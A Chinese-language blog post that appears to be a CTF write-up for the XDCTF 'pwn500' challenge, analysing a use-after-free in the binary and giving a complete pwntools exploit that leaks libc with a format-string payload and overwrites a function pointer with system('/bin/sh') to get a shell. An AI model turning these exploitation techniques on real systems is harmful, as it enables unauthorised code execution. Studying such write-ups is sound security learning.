---  
layout: post  
title: "xdctf_pwn500"  
date: 2015-10-06 14:27:24 +0800  
comments: true  
categories:   
---  
###0x00 分析
分析程序得如下数据结构
	name_desp
	{
		name[17];	0
		desp[200];	18
		math;		224
		english;	232
		dota;		240
	}

	item
	{
		int opt;	0
		int real_len;	4
		int want;	8
		int context_ptr;16
		func_p;		24
	}
子程序
	do
	i += input((__int64)&s[i], a2 - i);
	while ( i != a2 );
		fputs(s, stream);
	return 0LL;
fork的子程序栈溢出，返回的文件失败
导致real_len为0
	if ( *(_DWORD *)(ptr_item + 4) )
	  {
	    *(_QWORD *)(ptr_item + 16) = 0LL;
	    *(_DWORD *)(ptr_item + 4) = 0;
	  }
	  puts("OK, you could take the exam again\n");
resit时当real_len为0时，堆上的指针不清零,导致UAF

###0x01 利用
先exam一个，让子程序溢出，得到real_len为0，
再exam一个与item同样大小的chunk，通过1024选项覆写
先利用printf格式化字符串漏洞泄漏libc
再把/bin/sh和system的地址写上去


###0x02 exp

	from binascii import *  
	from pwn import *  
	  
	r = process('./jwc')  
	#r = remote('192.168.56.101', 6666)  
	  
	def opt(n):  
		print r.recvuntil('exit')  
		r.sendline(n)  
	  
	opt('1')	#register	  
	print r.recvuntil('chars')  
	r.sendline('namname')  
	print r.recvuntil('self')  
	r.sendline('despppppppppppp')  
	  
	  
	opt('2')	#exam	math  
	print r.recvuntil('dota')  
	r.sendline('1')  
	print r.recvuntil('?')  
	r.sendline('104')  
	print r.recvuntil('OK')  
	r.sendline('c'*104)  
	  
	  
	opt('5')	#resit  
	print r.recvuntil('dota')  
	r.sendline('1')  
	  
	opt('2')	#exam	math  
	print r.recvuntil('dota')  
	r.sendline('2')  
	print r.recvuntil('?')  
	r.sendline('4')  
	print r.recvuntil('OK')  
	r.sendline('abcd')  
	  
	printf_plt = 0x4009B0  
	puts_got = 0x0602330  
	  
	libc = ELF('/usr/lib/libc.so.6')  
	system_l = libc.symbols['system']  
	__libc_start_main_l = libc.symbols['__libc_start_main']  
	  
	  
	opt('1024')	#secret  
	print r.recvuntil(':)')  
	r.sendline('1')  
	payload  = ''  
	payload += '%11$pccc'  
	payload += 'aaaaaaaa'  
	payload += 'aaaaaaaa'  
	payload += p64(printf_plt)  
	r.sendline(payload)  
	  
	  
	opt('3')	#leak  
	print r.recvuntil('math: 0')  
	recv_data = r.recvuntil('en')  
	print (recv_data)  
	  
	__libc_start_main_r = int((recv_data)[1:15],16)-240  
	system_r = system_l - __libc_start_main_l + __libc_start_main_r  
	log.info('__libc_start_main_r'+hex(__libc_start_main_r))  
	log.info('__libc_start_main_l'+hex(__libc_start_main_l))  
	log.info('system_l'+hex(system_l) )  
	log.info('system_r'+hex(system_r) )  
	  
	opt('1024')	#secret  
	print r.recvuntil(':)')  
	r.sendline('1')  
	payload  = ''  
	payload += '/bin/sh\x00'  
	payload += 'aaaaaaaa'  
	payload += 'aaaaaaaa'  
	payload += p64(system_r)  
	r.sendline(payload)  
	  
	opt('3')	#shell  
	r.interactive()  
